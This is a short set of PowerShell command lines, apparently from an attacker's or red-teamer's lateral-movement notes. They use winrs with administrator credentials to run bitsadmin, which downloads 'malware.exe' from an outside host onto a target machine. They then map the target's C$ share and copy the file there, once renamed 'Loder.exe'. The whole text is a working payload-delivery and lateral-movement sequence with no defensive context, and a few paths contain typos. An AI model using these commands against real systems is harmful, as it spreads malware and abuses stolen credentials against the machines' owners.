
`PS > winrs -r:targetmachinename -u:administrator -p:password "bitsadmin /transfer WindowsupDates /Priority normal http://x.x.x.x/malware.exe C:\\Users\\Public\\malware.exe"

`PS > net use x: \\targetmachinename\C$\Users\Public /user:domain\user <password>
`PS > echo F | xcopy C:\malware.exe x:\malware.exe
`PS > echo F | xcopy C:\malware.exe \\targetmachinename\$C\Users\Publick\Loder.exe